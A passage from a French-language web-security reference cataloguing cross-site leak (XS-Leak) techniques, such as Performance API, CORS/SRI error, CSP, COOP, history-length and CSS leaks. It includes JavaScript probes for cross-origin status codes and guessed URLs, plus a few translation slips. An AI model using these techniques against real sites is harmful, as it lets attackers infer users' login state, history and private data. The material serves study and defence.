- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** Une ressource avec un en-tête X-Frame-Options ne crée pas d'entrée de chronométrage des ressources.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si une page n'est **pas autorisée** à être **rendu** dans un **iframe**, elle ne crée **pas d'entrée de performance**. En conséquence, un attaquant peut détecter l'en-tête de réponse **`X-Frame-Options`**.\
Il en va de même si vous utilisez une **balise** **embed**.

### Détection de téléchargement

- **Inclusion Methods**: Frames
- **Detectable Difference**: En-tête
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Les téléchargements ne créent pas d'entrées de chronométrage des ressources dans l'API de Performance.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

De même, à la fuite XS décrite, une **ressource qui est téléchargée** en raison de l'en-tête ContentDisposition ne crée également **pas d'entrée de performance**. Cette technique fonctionne dans tous les navigateurs majeurs.

### Fuite de début de redirection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Redirection
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** L'entrée de chronométrage des ressources révèle le temps de début d'une redirection.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Nous avons trouvé un cas de fuite XS qui abuse du comportement de certains navigateurs qui enregistrent trop d'informations pour les requêtes d'origine croisée. La norme définit un sous-ensemble d'attributs qui doivent être définis à zéro pour les ressources d'origine croisée. Cependant, dans **SA**, il est possible de détecter si l'utilisateur est **redirigé** par la page cible, en interrogeant l'**API de Performance** et en vérifiant les **données de chronométrage redirectStart**.

### Fuite de durée de redirection

- **Inclusion Methods**: API Fetch
- **Detectable Difference**: Redirection
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** La durée des entrées de chronométrage est négative lorsqu'une redirection se produit.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Dans GC, la **durée** des requêtes qui entraînent une **redirection** est **négative** et peut donc être **distinguée** des requêtes qui ne résultent pas en une redirection.

### Fuite CORP

- **Inclusion Methods**: Frames
- **Detectable Difference**: En-tête
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Les ressources protégées par CORP ne créent pas d'entrées de chronométrage des ressources.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Dans certains cas, l'entrée **nextHopProtocol** peut être utilisée comme une technique de fuite. Dans GC, lorsque l'en-tête **CORP** est défini, le nextHopProtocol sera **vide**. Notez que SA ne créera pas d'entrée de performance du tout pour les ressources activées par CORP.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: Utilisation de l'API
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Détecter si un service worker est enregistré pour une origine spécifique.
- **Code Example**:

Les service workers sont des contextes de script déclenchés par des événements qui s'exécutent à une origine. Ils s'exécutent en arrière-plan d'une page web et peuvent intercepter, modifier et **mettre en cache des ressources** pour créer des applications web hors ligne.\
Si une **ressource mise en cache** par un **service worker** est accédée via **iframe**, la ressource sera **chargée à partir du cache du service worker**.\
Pour détecter si la ressource a été **chargée à partir du cache du service worker**, l'**API de Performance** peut être utilisée.\
Cela pourrait également être fait avec une attaque de chronométrage (voir le document pour plus d'infos).

### Cache

- **Inclusion Methods**: API Fetch
- **Detectable Difference**: Chronométrage
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Il est possible de vérifier si une ressource a été stockée dans le cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

En utilisant l'[API de Performance](./#performance-api), il est possible de vérifier si une ressource est mise en cache.

### Durée du réseau

- **Inclusion Methods**: API Fetch
- **Detectable Difference**: Contenu de la page
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** Il est possible de récupérer la durée réseau d'une requête à partir de l'API `performance`.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technique des messages d'erreur

### Erreur multimédia

- **Inclusion Methods**: Éléments HTML (Vidéo, Audio)
- **Detectable Difference**: Code d'état
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Dans Firefox, il est possible de fuir avec précision le code d'état d'une requête d'origine croisée.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
L'interface `MediaError` a une propriété message qui identifie de manière unique les ressources qui se chargent avec succès grâce à une chaîne distincte. Un attaquant peut exploiter cette fonctionnalité en observant le contenu du message, déduisant ainsi l'état de la réponse d'une ressource cross-origin.

### Erreur CORS

- **Méthodes d'inclusion** : Fetch API
- **Différence détectable** : En-tête
- **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Résumé :** Dans les Assertions de Sécurité (SA), les messages d'erreur CORS exposent involontairement l'URL complète des requêtes redirigées.
- **Exemple de code** : [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet à un attaquant d'**extraire la destination d'une redirection d'un site cross-origin** en exploitant la manière dont les navigateurs basés sur Webkit gèrent les requêtes CORS. Plus précisément, lorsqu'une **requête activée CORS** est envoyée à un site cible qui émet une redirection basée sur l'état de l'utilisateur et que le navigateur refuse ensuite la requête, l'**URL complète de la cible de la redirection** est divulguée dans le message d'erreur. Cette vulnérabilité révèle non seulement le fait de la redirection, mais expose également le point de terminaison de la redirection et tout **paramètre de requête sensible** qu'il peut contenir.

### Erreur SRI

- **Méthodes d'inclusion** : Fetch API
- **Différence détectable** : En-tête
- **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Résumé :** Dans les Assertions de Sécurité (SA), les messages d'erreur CORS exposent involontairement l'URL complète des requêtes redirigées.
- **Exemple de code** : [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut exploiter des **messages d'erreur verbeux** pour déduire la taille des réponses cross-origin. Cela est possible grâce au mécanisme d'Intégrité des Sous-ressources (SRI), qui utilise l'attribut d'intégrité pour valider que les ressources récupérées, souvent depuis des CDN, n'ont pas été altérées. Pour que le SRI fonctionne sur des ressources cross-origin, celles-ci doivent être **activées CORS** ; sinon, elles ne sont pas soumises à des vérifications d'intégrité. Dans les Assertions de Sécurité (SA), tout comme l'erreur CORS XS-Leak, un message d'erreur peut être capturé après qu'une requête fetch avec un attribut d'intégrité échoue. Les attaquants peuvent délibérément **déclencher cette erreur** en assignant une **valeur de hachage fictive** à l'attribut d'intégrité de toute requête. Dans SA, le message d'erreur résultant révèle involontairement la longueur du contenu de la ressource demandée. Cette fuite d'information permet à un attaquant de discerner les variations de taille de réponse, ouvrant la voie à des attaques XS-Leak sophistiquées.

### Violation/Détection CSP

- **Méthodes d'inclusion** : Pop-ups
- **Différence détectable** : Code d'état
- **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Résumé :** En autorisant uniquement le site des victimes dans le CSP, si nous y accédons et qu'il essaie de rediriger vers un domaine différent, le CSP déclenchera une erreur détectable.
- **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak peut utiliser le CSP pour détecter si un site cross-origin a été redirigé vers une autre origine. Cette fuite peut détecter la redirection, mais en plus, le domaine de la cible de redirection fuit. L'idée de base de cette attaque est de **permettre le domaine cible sur le site de l'attaquant**. Une fois qu'une requête est émise vers le domaine cible, il **redirige** vers un domaine cross-origin. **CSP bloque** l'accès à celui-ci et crée un **rapport de violation utilisé comme technique de fuite**. Selon le navigateur, **ce rapport peut fuir l'emplacement cible de la redirection**.\
Les navigateurs modernes n'indiqueront pas l'URL vers laquelle il a été redirigé, mais vous pouvez toujours détecter qu'une redirection cross-origin a été déclenchée.

### Cache

- **Méthodes d'inclusion** : Frames, Pop-ups
- **Différence détectable** : Contenu de la page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Résumé :** Effacer le fichier du cache. Ouvre la page cible et vérifie si le fichier est présent dans le cache.
- **Exemple de code :**

Les navigateurs peuvent utiliser un cache partagé pour tous les sites web. Quel que soit leur origine, il est possible de déduire si une page cible a **demandé un fichier spécifique**.

Si une page charge une image uniquement si l'utilisateur est connecté, vous pouvez **invalider** la **ressource** (pour qu'elle ne soit plus mise en cache si elle l'était, voir les liens d'informations supplémentaires), **effectuer une requête** qui pourrait charger cette ressource et essayer de charger la ressource **avec une mauvaise requête** (par exemple, en utilisant un en-tête referer trop long). Si le chargement de la ressource **n'a pas déclenché d'erreur**, c'est parce qu'elle a été **mise en cache**.

### Directive CSP

- **Méthodes d'inclusion** : Frames
- **Différence détectable** : En-tête
- **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Résumé :** Les directives d'en-tête CSP peuvent être sondées à l'aide de l'attribut iframe CSP, révélant des détails sur la politique.
- **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Une nouvelle fonctionnalité dans Google Chrome (GC) permet aux pages web de **proposer une Politique de Sécurité de Contenu (CSP)** en définissant un attribut sur un élément iframe, avec des directives de politique transmises avec la requête HTTP. Normalement, le contenu intégré doit **autoriser cela via un en-tête HTTP**, sinon une **page d'erreur est affichée**. Cependant, si l'iframe est déjà régie par un CSP et que la nouvelle politique proposée n'est pas plus restrictive, la page se chargera normalement. Ce mécanisme ouvre une voie pour un attaquant de **détecter des directives CSP spécifiques** d'une page cross-origin en identifiant la page d'erreur. Bien que cette vulnérabilité ait été marquée comme corrigée, nos découvertes révèlent une **nouvelle technique de fuite** capable de détecter la page d'erreur, suggérant que le problème sous-jacent n'a jamais été complètement résolu.

### **CORP**

- **Méthodes d'inclusion** : Fetch API
- **Différence détectable** : En-tête
- **Plus d'infos** : [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Résumé :** Les ressources sécurisées par la Politique de Ressources Cross-Origin (CORP) généreront une erreur lorsqu'elles sont récupérées depuis une origine non autorisée.
- **Exemple de code** : [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

L'en-tête CORP est une fonctionnalité de sécurité relativement nouvelle sur la plateforme web qui, lorsqu'elle est définie, **bloque les requêtes cross-origin sans CORS vers la ressource donnée**. La présence de l'en-tête peut être détectée, car une ressource protégée par CORP **générera une erreur lorsqu'elle est récupérée**.

### CORB

- **Méthodes d'inclusion** : Éléments HTML
- **Différence détectable** : En-têtes
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Résumé** : CORB peut permettre aux attaquants de détecter quand l'**en-tête `nosniff` est présent** dans la requête.
- **Exemple de code** : [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Vérifiez le lien pour plus d'informations sur l'attaque.

### Erreur CORS sur la mauvaise configuration de réflexion d'origine <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Méthodes d'inclusion** : Fetch API
- **Différence détectable** : En-têtes
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Résumé :** Si l'en-tête Origin est réfléchi dans l'en-tête `Access-Control-Allow-Origin`, il est possible de vérifier si une ressource est déjà dans le cache.
- **Exemple de code** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Dans le cas où l'**en-tête Origin** est **réfléchi** dans l'en-tête `Access-Control-Allow-Origin`, un attaquant peut abuser de ce comportement pour essayer de **récupérer** la **ressource** en mode **CORS**. Si une **erreur** **n'est pas** déclenchée, cela signifie qu'elle a été **correctement récupérée depuis le web**, si une erreur est **déclenchée**, c'est parce qu'elle a été **accédée depuis le cache** (l'erreur apparaît parce que le cache enregistre une réponse avec un en-tête CORS autorisant le domaine d'origine et non le domaine de l'attaquant).\
Notez que si l'origine n'est pas réfléchie mais qu'un caractère générique est utilisé (`Access-Control-Allow-Origin: *`), cela ne fonctionnera pas.

## Technique des Attributs Lisibles

### Redirection Fetch

- **Méthodes d'inclusion** : Fetch API
- **Différence détectable** : Code d'état
- **Plus d'infos** : [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Résumé :** GC et SA permettent de vérifier le type de réponse (opaque-redirect) après que la redirection soit terminée.
- **Exemple de code** : [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

En soumettant une requête en utilisant l'API Fetch avec `redirect: "manual"` et d'autres paramètres, il est possible de lire l'attribut `response.type` et s'il est égal à `opaqueredirect`, alors la réponse était une redirection.

### COOP

- **Méthodes d'inclusion** : Pop-ups
- **Différence détectable** : En-tête
- **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Résumé :** Les pages protégées par la Politique d'Ouverture Cross-Origin (COOP) empêchent l'accès aux interactions cross-origin.
- **Exemple de code** : [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaquant est capable de déduire la présence de l'en-tête Politique d'Ouverture Cross-Origin (COOP) dans une réponse HTTP cross-origin. COOP est utilisé par les applications web pour empêcher les sites externes d'obtenir des références de fenêtres arbitraires. La visibilité de cet en-tête peut être discernée en tentant d'accéder à la **référence `contentWindow`**. Dans les scénarios où COOP est appliqué de manière conditionnelle, la **propriété `opener`** devient un indicateur révélateur : elle est **indéfinie** lorsque COOP est actif, et **définie** en son absence.

### Longueur Max de l'URL - Côté Serveur

- **Méthodes d'inclusion** : Fetch API, Éléments HTML
- **Différence détectable** : Code d'état / Contenu
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Résumé :** Détecter les différences dans les réponses en raison de la longueur de la réponse de redirection qui pourrait être trop grande pour que le serveur réponde avec une erreur et qu'une alerte soit générée.
- **Exemple de code** : [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si une redirection côté serveur utilise **des entrées utilisateur à l'intérieur de la redirection** et **des données supplémentaires**. Il est possible de détecter ce comportement car généralement **les serveurs** ont une **limite de longueur de requête**. Si les **données utilisateur** sont de cette **longueur - 1**, parce que la **redirection** utilise **ces données** et **ajoute** quelque chose **de supplémentaire**, cela déclenchera une **erreur détectable via les Événements d'Erreur**.

Si vous pouvez d'une manière ou d'une autre définir des cookies pour un utilisateur, vous pouvez également effectuer cette attaque en **définissant suffisamment de cookies** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) donc avec la **taille de réponse augmentée** de la **réponse correcte**, une **erreur** est déclenchée. Dans ce cas, rappelez-vous que si vous déclenchez cette requête depuis un même site, `<script>` enverra automatiquement les cookies (vous pouvez donc vérifier les erreurs).\
Un exemple de **cookie bomb + XS-Search** peut être trouvé dans la solution prévue de cette rédaction : [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou être dans le même contexte est généralement nécessaire pour ce type d'attaque.

### Longueur Max de l'URL - Côté Client

- **Méthodes d'inclusion** : Pop-ups
- **Différence détectable** : Code d'état / Contenu
- **Plus d'infos** : [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Résumé :** Détecter les différences dans les réponses en raison de la longueur de la réponse de redirection qui pourrait être trop grande pour qu'une différence puisse être remarquée.
- **Exemple de code** : [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Selon [la documentation de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), la longueur maximale d'URL de Chrome est de 2 Mo.

> En général, la _plateforme web_ n'a pas de limites sur la longueur des URL (bien que 2^31 soit une limite courante). _Chrome_ limite les URL à une longueur maximale de **2 Mo** pour des raisons pratiques et pour éviter de causer des problèmes de déni de service dans la communication inter-processus.

Par conséquent, si la **redirection URL répond est plus grande dans l'un des cas**, il est possible de la faire rediriger avec une **URL plus grande que 2 Mo** pour atteindre la **limite de longueur**. Lorsque cela se produit, Chrome affiche une page **`about:blank#blocked`**.

La **différence notable**, est que si la **redirection** a été **complétée**, `window.origin` génère une **erreur** car une origine croisée ne peut pas accéder à cette info. Cependant, si la **limite** a été \*\*\*\* atteinte et que la page chargée était **`about:blank#blocked`**, l'**origine** de la fenêtre reste celle du **parent**, ce qui est une **information accessible.**

Toutes les informations supplémentaires nécessaires pour atteindre les **2 Mo** peuvent être ajoutées via un **hash** dans l'URL initiale afin qu'il soit **utilisé dans la redirection**.

{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Max Redirections

- **Méthodes d'inclusion** : Fetch API, Frames
- **Différence détectable** : Code d'état
- **Plus d'infos** : [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Résumé :** Utiliser la limite de redirection du navigateur pour déterminer la survenue de redirections d'URL.
- **Exemple de code** : [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si le **nombre max** de **redirections** à suivre d'un navigateur est **20**, un attaquant pourrait essayer de charger sa page avec **19 redirections** et finalement **envoyer la victime** vers la page testée. Si une **erreur** est déclenchée, alors la page essayait de **rediriger la victime**.

### Longueur de l'Historique

- **Méthodes d'inclusion** : Frames, Pop-ups
- **Différence détectable** : Redirections
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Résumé :** Le code JavaScript manipule l'historique du navigateur et peut être accédé par la propriété length.
- **Exemple de code** : [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

L'**API History** permet au code JavaScript de manipuler l'historique du navigateur, qui **enregistre les pages visitées par un utilisateur**. Un attaquant peut utiliser la propriété length comme méthode d'inclusion : pour détecter la navigation JavaScript et HTML.\
**Vérifiant `history.length`**, en faisant **naviguer** un utilisateur vers une page, **en revenant** à la même origine et **en vérifiant** la nouvelle valeur de **`history.length`**.

### Longueur de l'Historique avec la même URL

- **Méthodes d'inclusion** : Frames, Pop-ups
- **Différence détectable** : Si l'URL est la même que celle devinée
- **Résumé :** Il est possible de deviner si l'emplacement d'un frame/pop-up est dans une URL spécifique en abusant de la longueur de l'historique.
- **Exemple de code** : Ci-dessous

Un attaquant pourrait utiliser du code JavaScript pour **manipuler l'emplacement du frame/pop-up vers une URL devinée** et **immédiatement** **le changer en `about:blank`**. Si la longueur de l'historique a augmenté, cela signifie que l'URL était correcte et qu'elle a eu le temps d'**augmenter car l'URL n'est pas rechargée si elle est la même**. Si elle n'a pas augmenté, cela signifie qu'elle **a essayé de charger l'URL devinée**, mais parce que nous **l'avons immédiatement après** chargée **`about:blank`**, la **longueur de l'historique n'a jamais augmenté** lors du chargement de l'URL devinée.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Comptage de Cadres

- **Méthodes d'Inclusion** : Cadres, Pop-ups
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Résumé :** Évaluer la quantité d'éléments iframe en inspectant la propriété `window.length`.
- **Exemple de Code** : [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de cadres dans un web** ouvert via `iframe` ou `window.open` peut aider à identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le même nombre de cadres, vérifier **en continu** le nombre de cadres peut aider à identifier un **modèle** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans Chrome, un **PDF** peut être **détecté** avec **le comptage de cadres** car un `embed` est utilisé en interne. Il existe des [Paramètres d'URL Ouverts](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contrôle sur le contenu tel que `zoom`, `view`, `page`, `toolbar` où cette technique pourrait être intéressante.

### Éléments HTML

- **Méthodes d'Inclusion** : Éléments HTML
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Résumé :** Lire la valeur divulguée pour distinguer entre 2 états possibles
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La fuite d'informations à travers les éléments HTML est une préoccupation en matière de sécurité web, en particulier lorsque des fichiers multimédias dynamiques sont générés en fonction des informations de l'utilisateur, ou lorsque des filigranes sont ajoutés, modifiant la taille du média. Cela peut être exploité par des attaquants pour différencier entre des états possibles en analysant les informations exposées par certains éléments HTML.

### Informations Exposées par les Éléments HTML

- **HTMLMediaElement** : Cet élément révèle la `durée` et les temps `buffered` du média, qui peuvent être accessibles via son API. [En savoir plus sur HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement** : Il expose `videoHeight` et `videoWidth`. Dans certains navigateurs, des propriétés supplémentaires comme `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, et `webkitDecodedFrameCount` sont disponibles, offrant des informations plus détaillées sur le contenu multimédia. [En savoir plus sur HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()** : Cette fonction fournit des détails sur la qualité de lecture vidéo, y compris `totalVideoFrames`, qui peut indiquer la quantité de données vidéo traitées. [En savoir plus sur getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement** : Cet élément divulgue la `hauteur` et la `largeur` d'une image. Cependant, si une image est invalide, ces propriétés retourneront 0, et la fonction `image.decode()` sera rejetée, indiquant l'échec de chargement correct de l'image. [En savoir plus sur HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propriété CSS

- **Méthodes d'Inclusion** : Éléments HTML
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Résumé :** Identifier les variations dans le style du site web qui correspondent à l'état ou au statut de l'utilisateur.
- **Exemple de Code** : [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site web en fonction du statut de l'utilisateur**. Des fichiers CSS cross-origin peuvent être intégrés sur la page de l'attaquant avec l'**élément de lien HTML**, et les **règles** seront **appliquées** à la page de l'attaquant. Si une page change dynamiquement ces règles, un attaquant peut **détecter** ces **différences** en fonction de l'état de l'utilisateur.\
En tant que technique de fuite, l'attaquant peut utiliser la méthode `window.getComputedStyle` pour **lire les propriétés CSS** d'un élément HTML spécifique. En conséquence, un attaquant peut lire des propriétés CSS arbitraires si l'élément affecté et le nom de la propriété sont connus.

### Historique CSS

- **Méthodes d'Inclusion** : Éléments HTML
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Résumé :** Détecter si le style `:visited` est appliqué à une URL indiquant qu'elle a déjà été visitée
- **Exemple de Code** : [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome sans tête.

Le sélecteur CSS `:visited` est utilisé pour styliser les URL différemment si elles ont été précédemment visitées par l'utilisateur. Dans le passé, la méthode `getComputedStyle()` pouvait être utilisée pour identifier ces différences de style. Cependant, les navigateurs modernes ont mis en œuvre des mesures de sécurité pour empêcher cette méthode de révéler l'état d'un lien. Ces mesures incluent le retour systématique du style calculé comme si le lien avait été visité et la restriction des styles pouvant être appliqués avec le sélecteur `:visited`.

